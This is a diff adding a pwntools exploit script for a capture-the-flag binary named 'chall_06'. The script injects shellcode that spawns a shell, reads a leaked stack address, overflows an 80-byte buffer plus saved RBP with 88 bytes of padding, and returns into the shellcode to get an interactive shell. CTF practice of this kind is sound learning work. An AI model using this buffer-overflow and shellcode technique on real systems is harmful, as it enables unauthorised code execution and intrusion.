@@ -13,4 +13,38 @@ chall_06: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically l
 
 Radare2:
 afl --> list all functions
+
+Buffer is 96 long; call rax is last 8 bytes store address  here
 '''
+
+# Import Libraries
+from pwn import *
+
+# Variables
+padding = b'a'*88      # Vuln only has 80 byte buffer + 8 RBP
+context.arch = "amd64"
+shell = asm(shellcraft.sh())
+shellLen = len(shell)
+print("Shell Length: ", shellLen)   # For Debugging
+
+# Start process and find leak
+p=process("./chall_06")
+resp=p.recvuntil(b': ')
+leak=p.recvuntil(b'\n')
+leakInt=p64(int(leak,16))
+
+# Craft payload to get shell on stack
+payload=b''
+payload+=shell
+print("SENDING SHELL:")
+p.sendline(payload)
+
+# Call vulnerable leak, will pop shell
+
+payload=b''
+payload+=padding+leakInt
+p.sendline(b"\n")
+p.sendlineafter(b"I drink milk even though i'm lactose intolerant:",payload)
+print("RETURNING TO VULN")
+
+p.interactive()
